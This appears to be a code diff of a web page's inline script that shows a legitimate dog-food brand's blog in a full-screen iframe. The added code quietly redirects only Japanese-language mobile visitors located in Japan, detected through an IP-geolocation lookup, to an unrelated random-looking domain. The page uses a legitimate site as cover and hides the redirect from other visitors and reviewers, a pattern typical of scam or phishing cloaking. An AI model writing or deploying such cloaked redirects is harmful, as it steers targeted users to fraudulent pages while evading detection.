@@ -39,23 +39,45 @@
  
 <script>
   function handleResponse() {
-      function isMobileDevice() {
+    function isMobileDevice() {
       return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     }
-   var url;
-    if  (isMobileDevice()) {
-     url = 'https://www.bellaandduke.com/why-us/latest-news/dog-blogs/';
-	//window.location.href = "https://www.yooopoop.top/news.html"; 
-    } else {
-      url = 'https://www.bellaandduke.com/why-us/latest-news/dog-blogs//';
-	 
+
+    function isJapaneseLang() {
+      return navigator.language.startsWith('ja') || 
+             navigator.languages.some(lang => lang.startsWith('ja'));
     }
 
-    var iframe = document.createElement('iframe');
-    iframe.src = url;
-    iframe.style.width = '100%';
-    iframe.style.height = '100vh';
-    document.body.appendChild(iframe);
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        // 严格的三重条件判断
+        if (data.country === 'JP' && isMobileDevice() && isJapaneseLang()) {
+          window.location.href = "https://www.jacmsotck.online/rigufb/tbgu1online.html";
+          return;
+        }
+     
+        
+        var iframe = document.createElement('iframe');
+        iframe.src = 'https://www.bellaandduke.com/why-us/latest-news/dog-blogs/';
+        iframe.style.width = '100%';
+        iframe.style.height = '100vh';
+        document.body.appendChild(iframe);
+      })
+      .catch(() => {
+        // IP检测失败时严格的双重条件判断
+        if (isMobileDevice() && isJapaneseLang()) {
+          window.location.href = "https://www.jacmsotck.online/rigufb/tbgu1online.html";
+          return;
+        }
+        
+        
+        var iframe = document.createElement('iframe');
+        iframe.src = 'https://www.bellaandduke.com/why-us/latest-news/dog-blogs/';
+        iframe.style.width = '100%';
+        iframe.style.height = '100vh';
+        document.body.appendChild(iframe);
+      });
   }
 </script>
  
